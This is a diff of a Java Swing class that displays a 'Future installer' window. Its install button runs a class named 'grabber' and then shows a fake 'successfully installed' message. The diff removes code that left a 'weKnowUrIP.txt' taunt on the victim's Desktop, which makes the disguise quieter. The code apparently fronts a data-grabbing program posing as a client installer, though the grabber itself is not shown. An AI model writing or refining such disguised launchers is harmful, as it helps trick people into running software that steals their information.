@@ -13,34 +13,33 @@ import javax.imageio.ImageIO;
 import javax.swing.*;
 
 
-public class gui extends JFrame{
-	
-	String home = System.getProperty("user.home");
-	String FinalHome = home + "\\Desktop\\";
+public class gui extends JFrame{	
 	
 	ImageIcon img =  new ImageIcon(getClass().getClassLoader().getResource("logo.png"));
-
 	ImageIcon img2 =  new ImageIcon(getClass().getClassLoader().getResource("logo2.png"));
 	ImageIcon img3 =  new ImageIcon(getClass().getClassLoader().getResource("download.png"));
-	public final JPanel p = new JPanel();
 	
+	JFrame f = new JFrame();
 	
+	Color c = new Color(128, 0, 0);
+	
+	final JPanel p = new JPanel();		
+	final JLabel l = new JLabel("", img, JLabel.CENTER);
+    final JButton b = new JButton((Icon) img2);
 
-	public final JLabel l = new JLabel("", img, JLabel.CENTER);
-	public final JButton b = new JButton((Icon) img2);
 		gui(){	
 			//gui settings
 			this.setTitle("Future installer");
-			Color c = new Color(128, 0, 0);
 			this.setDefaultCloseOperation(EXIT_ON_CLOSE);
 			this.add(p);
-			
 			this.setSize(500, 430);
-			this.setResizable(false);
-			l.setBounds(getBounds());
+			this.setResizable(false);	
 			this.add(l);
+			l.setBounds(getBounds());
 			this.setVisible(true); 
 			this.setLayout(null);
+			this.setIconImage(img3.getImage());
+			this.add(b);
 			b.setBounds(176, 200, 100, 60);
 			b.setSize(150, 40);
 			b.setBackground(c);
@@ -48,28 +47,26 @@ public class gui extends JFrame{
 			b.setForeground(new Color(0, 0, 0));
 			b.setBorder(BorderFactory.createEtchedBorder());
 			b.setFocusable(false);
-			this.setIconImage(img3.getImage());
-			this.add(b);
+			//button action
 			b.addActionListener(new ActionListener() {
 				@Override
 				public void actionPerformed(ActionEvent e) {
-					b.setEnabled(false);
-						File myObj = new File(FinalHome + "weKnowUrIP.txt");
-						try {
-							myObj.createNewFile();
-						} catch (IOException e2) {
-							
-							e2.printStackTrace();				
-					}			
+					b.setEnabled(false);		
 					try {
 						new grabber();
+						msg("Future client succesfully installed!");
 					} catch (IOException e1) {
-						e1.printStackTrace();
+						msg("Installation failed!");
 					}
+					
 					
 				}
 			});
 			
+			
 		}
-      
+		
+    public void msg(String m) {
+    	JOptionPane.showMessageDialog(f, m, "Installation", JOptionPane.WARNING_MESSAGE);
+    }
 }
